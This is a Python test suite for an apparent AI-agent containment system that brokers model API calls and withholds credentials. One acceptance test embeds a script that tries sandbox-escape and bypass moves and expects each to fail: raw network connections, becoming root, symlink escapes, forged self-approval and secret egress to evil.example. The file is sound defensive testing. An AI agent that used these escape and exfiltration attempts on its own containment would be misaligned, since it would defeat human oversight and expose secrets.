import base64
import io
import json
import os
import struct
import threading

import httpx
import pytest

from actenon_airlock.cli import main
from actenon_airlock.common import AirlockError
from actenon_airlock.contained_bridge import receive, send
from actenon_airlock.manifest import authority_diff, discover
from actenon_airlock.protected import (
    Docker,
    ProtectedBroker,
    _write_pipe,
    launch_protected,
    snapshot,
)
from actenon_airlock.state import State

URL = "https://api.openai.com/v1/chat/completions"
PROFILE = {"provider": "openai", "models": ["test-model"], "max_output_tokens": 256}


def request(**changes):
    body = {
        "model": "test-model",
        "messages": [{"role": "user", "content": "fix the code"}],
        **changes,
    }
    return {
        "kind": "protected-http",
        "method": "POST",
        "url": URL,
        "headers": {"Content-Type": "application/json", "Authorization": "Bearer agent-controlled"},
        "body": base64.b64encode(json.dumps(body).encode()).decode(),
    }


def model_reply(content="def add(a, b):\n    return a + b\n"):
    return {
        "id": "chatcmpl-offline",
        "object": "chat.completion",
        "created": 0,
        "model": "test-model",
        "choices": [
            {
                "index": 0,
                "message": {"role": "assistant", "content": content},
                "finish_reason": "stop",
            }
        ],
        "usage": {"prompt_tokens": 20, "completion_tokens": 12, "total_tokens": 32},
    }


def model_project(root, source):
    (root / "main.py").write_text(source)
    state = State(root)
    state.approve({**discover(root, env={}), "protected_model": PROFILE})
    return state


def test_bridge_completes_partial_writes_and_preserves_framing():
    class Partial(io.BytesIO):
        def write(self, data):
            return super().write(data[:3])

    stream = Partial()
    send(stream, {"bridge": "ready", "version": 1})
    stream.seek(0)
    assert receive(stream) == {"bridge": "ready", "version": 1}


def test_supervisor_pipe_completes_large_response():
    read_fd, write_fd = os.pipe()
    data = struct.pack("!I", 300000) + b"x" * 300000
    captured = bytearray()
    with (
        os.fdopen(read_fd, "rb", buffering=0) as reader,
        os.fdopen(write_fd, "wb", buffering=0) as writer,
    ):

        def consume():
            while len(captured) < len(data):
                captured.extend(reader.read(4096))

        thread = threading.Thread(target=consume)
        thread.start()
        _write_pipe(writer, data)
        thread.join(timeout=5)
        assert not thread.is_alive()
    assert captured == data


def test_trusted_diff_detects_model_expansion_and_accepts_reduction():
    before = {"powers": [], "protected_model": PROFILE}
    base = {"powers": [], "blocked": [], "parse_errors": []}
    expanded = authority_diff(
        before, {**base, "protected_model": {**PROFILE, "models": ["test-model", "new-model"]}}
    )
    assert expanded["model_constraints"]["expanded"]
    assert expanded["runtime_status"] == "BLOCKED UNTIL APPROVED"
    reduced = authority_diff(
        before, {**base, "protected_model": {**PROFILE, "max_output_tokens": 100}}
    )
    assert not reduced["model_constraints"]["expanded"]


def test_required_protection_never_launches_cooperative_fallback(project, monkeypatch):
    state = project("print('should not run')\n")
    calls = []
    monkeypatch.setattr("actenon_airlock.broker.launch", lambda *a, **k: calls.append(1))
    monkeypatch.setattr(
        Docker,
        "verify_engine",
        lambda *a: (_ for _ in ()).throw(AirlockError("engine unavailable")),
    )
    assert main(["run", "--path", str(state.root), "--protected", "--", "main.py"]) == 2
    assert calls == []


def test_snapshot_never_copies_state_env_or_git_credentials(tmp_path):
    root, destination = tmp_path / "source", tmp_path / "copy"
    root.mkdir()
    for name in (".airlock", ".git", ".ssh"):
        (root / name).mkdir()
        (root / name / "private-key").write_text("not for the agent")
    (root / ".env.production").write_text("real keys")
    (root / "main.py").write_text("print('normal code')")
    snapshot(root, destination)
    assert sorted(p.name for p in destination.iterdir()) == ["main.py"]
    assert (destination / "main.py").read_text() == "print('normal code')"


def test_snapshot_refuses_embedded_bound_credential_and_host_symlink(tmp_path):
    root = tmp_path / "source"
    root.mkdir()
    (root / "config.txt").write_text("test-real-secret")
    with pytest.raises(AirlockError, match="credential"):
        snapshot(root, tmp_path / "copy", ["test-real-secret"])
    (root / "config.txt").unlink()
    (root / "escape").symlink_to("/etc/passwd")
    with pytest.raises(AirlockError, match="link"):
        snapshot(root, tmp_path / "second-copy")


@pytest.mark.parametrize(
    "change",
    [
        {"model": "unapproved"},
        {"max_tokens": 257},
        {"max_tokens": True},
        {"tools": [{"type": "web_search"}]},
        {"store": True},
        {"n": 2},
        {
            "messages": [
                {
                    "role": "user",
                    "content": [
                        {"type": "image_url", "image_url": {"url": "https://evil.example"}}
                    ],
                }
            ]
        },
    ],
)
def test_model_constraint_denies_before_credential_or_transport(tmp_path, monkeypatch, change):
    monkeypatch.setenv("OPENAI_API_KEY", "supervisor-test-secret")
    state = model_project(
        tmp_path,
        "from openai import OpenAI\nOpenAI().chat.completions.create(model='test-model', messages=[])\n",
    )
    broker = ProtectedBroker(state, discover(state.root))
    observed = []
    broker.http.close()
    broker.http = httpx.Client(
        transport=httpx.MockTransport(
            lambda req: observed.append(req) or httpx.Response(200, json=model_reply())
        )
    )
    try:
        assert not broker.handle(request(**change))["ok"]
        assert observed == []
        row = state.verify_receipts()["rows"][-1]
        assert row["verified"]
        assert row["row"]["execution_occurred"] is False
        assert row["row"]["credential_released"] is False
    finally:
        broker.close()


def test_protected_model_uses_real_engine_exact_bytes_and_observed_completion(
    tmp_path, monkeypatch
):
    monkeypatch.setenv("OPENAI_API_KEY", "supervisor-test-secret")
    state = model_project(
        tmp_path,
        "from openai import OpenAI\nOpenAI().chat.completions.create(model='test-model', messages=[])\n",
    )
    broker = ProtectedBroker(state, discover(state.root))
    observed = []
    broker.http.close()
    broker.http = httpx.Client(
        transport=httpx.MockTransport(
            lambda req: observed.append(req) or httpx.Response(200, json=model_reply())
        )
    )
    try:
        result = broker.handle(request())
        assert result["ok"] and result["outcome"] == "COMMITTED"
        assert len(observed) == 1
        assert observed[0].headers["authorization"] == "Bearer supervisor-test-secret"
        assert json.loads(observed[0].content)["max_tokens"] == 256
        assert not broker.handle(request())["ok"]
        assert len(observed) == 1  # Same logical inference is not charged/executed twice.
        rows = state.verify_receipts()
        assert rows["ok"]
        completed = next(
            item["row"] for item in rows["rows"] if item["row"].get("outcome") == "COMMITTED"
        )
        assert completed["execution_occurred"] is True
        assert completed["credential_released"] is True
        assert completed["proof_id"]
        assert "supervisor-test-secret" not in state.receipts_path.read_text()
        assert broker.store.get_grant(broker.grant.id).budget.remaining == 127
    finally:
        broker.close()


def test_agent_claimed_policy_cannot_authorize_protected_edge(project):
    state = project("print('free compute')\n")
    broker = ProtectedBroker(state, discover(state.root))
    try:
        message = {
            **request(),
            "url": "https://api.github.com/repos/acme/payments/issues",
            "action": "ALLOW",
            "approved": True,
            "locations": [{"file": "main.py", "line": 1, "col": 0}],
        }
        assert not broker.handle(message)["ok"]
        assert not broker.handle({"kind": "approve", "powers": ["*"]})["ok"]
        assert not broker.handle({"kind": "reconcile", "outcome": "COMMITTED"})["ok"]
        assert all(
            not item["row"]["execution_occurred"] for item in state.verify_receipts()["rows"]
        )
    finally:
        broker.close()


def test_same_contained_environment_runs_engineering_workflow_and_refuses_bypass(
    tmp_path, monkeypatch
):
    image = os.environ.get("AIRLOCK_TEST_PROTECTED_IMAGE")
    if not image:
        pytest.skip("Protected container acceptance runs in its required separate CI job")
    sentinel = tmp_path / "protected-host-secret"
    sentinel.write_text("host-only-test-data")
    root = tmp_path / "project"
    root.mkdir()
    (root / "calculator.py").write_text("def add(a, b):\n    return a - b\n")
    (root / "test_calculator.py").write_text(
        "from calculator import add\ndef test_add():\n    assert add(2, 3) == 5\n"
    )
    source = """from openai import OpenAI
from pathlib import Path
import importlib.util, json, os, socket, subprocess, sys
response = OpenAI().chat.completions.create(model="test-model", messages=[{"role":"user","content":"fix add"}])
Path("calculator.py").write_text(response.choices[0].message.content)
subprocess.run(["python3", "-m", "pytest", "-q"], check=True)
subprocess.run(["sh", "-c", "python3 -m compileall -q calculator.py && echo build-passed"], check=True)
for args in (["init"], ["config","user.name","Contained agent"], ["config","user.email","agent@example.invalid"], ["add","calculator.py","test_calculator.py"], ["-c","commit.gpgsign=false","commit","-m","Fix addition"]):
    subprocess.run(["git", *args], check=True)
assert os.getuid() == 10000
assert os.environ["OPENAI_API_KEY"] == "airlock-no-standing-credential"
assert not Path(".airlock/local/key.json").exists()
assert not Path("/var/run/docker.sock").exists()
assert not Path(HOST_SENTINEL).exists()
assert not Path(HOST_KEY).exists()
outcomes = {}
def blocked(name, operation):
    try: operation()
    except OSError: outcomes[name] = "blocked"
    else: raise AssertionError("bypass worked: " + name)
blocked("raw_network", lambda: socket.create_connection(("1.1.1.1",443),timeout=2))
blocked("raw_packet", lambda: socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 3))
blocked("outside_workspace", lambda: Path("/etc/airlock-bypass").write_text("x"))
blocked("become_root", lambda: os.setuid(0))
Path("escape").symlink_to("/airlock/contained_agent.py")
blocked("symlink_escape", lambda: Path("escape").write_text("replaced supervisor"))
blocked("replace_bridge_socket", lambda: Path("/ipc/broker.sock").unlink())
child = 'import socket; socket.create_connection(("1.1.1.1",443),timeout=2)'
assert subprocess.run(["python3","-c",child]).returncode != 0
outcomes["nested_child_network"] = "blocked"
assert subprocess.run(["git","push","https://github.com/acme/blocked","HEAD:main"],env=dict(os.environ,GIT_TERMINAL_PROMPT="0"),timeout=15).returncode != 0
outcomes["unauthorized_git_push"] = "blocked"
# Change cwd/env and create a fake policy: none becomes supervisor input.
Path(".airlock/local").mkdir(parents=True)
Path(".airlock/approved.json").write_text('{"powers":["*"]}')
os.environ["ACTENON_SIGNING_KEY"] = "agent-chosen"
spec = importlib.util.spec_from_file_location("untrusted_relay", "/airlock/contained_agent.py")
relay = importlib.util.module_from_spec(spec); spec.loader.exec_module(relay)
for name, message in {
    "issue_write":{"kind":"protected-http","method":"POST","url":"https://api.github.com/repos/acme/payments/issues","headers":{},"body":""},
    "repo_delete":{"kind":"protected-http","method":"DELETE","url":"https://api.github.com/repos/acme/payments","headers":{},"body":""},
    "secret_egress":{"kind":"protected-http","method":"POST","url":"https://evil.example/collect","headers":{},"body":""},
    "self_approve":{"kind":"approve","approved":True,"powers":["*"]},
    "self_reconcile":{"kind":"reconcile","outcome":"COMMITTED"},
}.items():
    assert not relay.rpc(message)["ok"]
    outcomes[name] = "blocked"
Path("acceptance.json").write_text(json.dumps(outcomes,sort_keys=True))
"""
    # Only path names are passed into input; host secret bytes are never staged.
    source = (
        "HOST_SENTINEL="
        + repr(str(sentinel))
        + "\nHOST_KEY="
        + repr(str(root / ".airlock/local/key.json"))
        + "\n"
        + source
    )
    state = model_project(root, source)
    monkeypatch.setenv("OPENAI_API_KEY", "supervisor-test-secret")
    observed = []
    original = ProtectedBroker.__init__

    def initialize(self, *args, **kwargs):
        original(self, *args, **kwargs)
        self.http.close()
        self.http = httpx.Client(
            transport=httpx.MockTransport(
                lambda req: observed.append(req) or httpx.Response(200, json=model_reply())
            )
        )

    monkeypatch.setattr(ProtectedBroker, "__init__", initialize)
    assert launch_protected(root, ["python3", "main.py"], image=image) == 3
    assert len(observed) == 1
    run = next((state.local / "runs").iterdir())
    workspace = run / "workspace"
    assert len(json.loads((workspace / "acceptance.json").read_text())) == 13
    assert (workspace / ".git").is_dir()
    assert (root / "calculator.py").read_text().endswith("return a - b\n")
    assert sentinel.read_text() == "host-only-test-data"
    receipts = state.verify_receipts()
    assert receipts["ok"]
    denied = [item["row"] for item in receipts["rows"] if item["row"]["decision"] == "DENY"]
    assert len(denied) == 5
    assert all(
        row["execution_occurred"] is False and not row["credential_released"] for row in denied
    )
    assert json.loads((run / "boundary.json").read_text())["agent"]["network"] == "none"
    evidence = os.environ.get("AIRLOCK_PROTECTED_EVIDENCE")
    if evidence:
        import shutil
        from pathlib import Path

        output = Path(evidence)
        output.mkdir(parents=True, exist_ok=True)
        for name in ("boundary.json", "result.json"):
            shutil.copyfile(run / name, output / name)
        shutil.copyfile(workspace / "acceptance.json", output / "bypass-outcomes.json")
        shutil.copyfile(state.receipts_path, output / "receipts.jsonl")
        shutil.copyfile(state.path / "public-key.json", output / "public-key.json")
        (output / "receipt-verification.json").write_text(
            json.dumps(
                {
                    "ok": receipts["ok"],
                    "verified": receipts["verified"],
                    "denials": len(denied),
                    "model_fixture": True,
                    "external_coding_agent_acceptance": False,
                },
                indent=2,
            )
            + "\n"
        )
